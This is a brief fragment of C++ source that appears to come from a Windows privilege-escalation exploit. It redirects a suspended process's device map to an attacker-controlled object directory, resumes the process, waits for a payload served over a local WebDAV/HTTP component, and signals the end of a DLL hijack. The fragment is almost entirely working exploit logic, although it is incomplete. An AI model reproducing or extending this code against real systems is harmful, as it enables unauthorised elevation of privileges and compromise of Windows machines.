      PROCESS_DEVICEMAP_INFORMATION DeviceMap{ RPCControlDir.getHandle() };
      THROW_ON_ERR(NtSetInformationProcess(suspended.hProcess, ProcessDeviceMap, &DeviceMap, sizeof(DeviceMap)));
      ResumeThread(suspended.hThread);
      cout << "Waiting for served payload signal..." << endl;
      httpd::servedPayload.waitForSignal();
      cout << "got served payload signal..." << endl;
   }
   httpd::stoppedDllHijack.signalPulse();
   httpd::webdav::webdav.join();
    
}
catch (abortError& e) { cout << e.what() << endl; }
catch (...) { cout << "Unexspected error" << endl; }



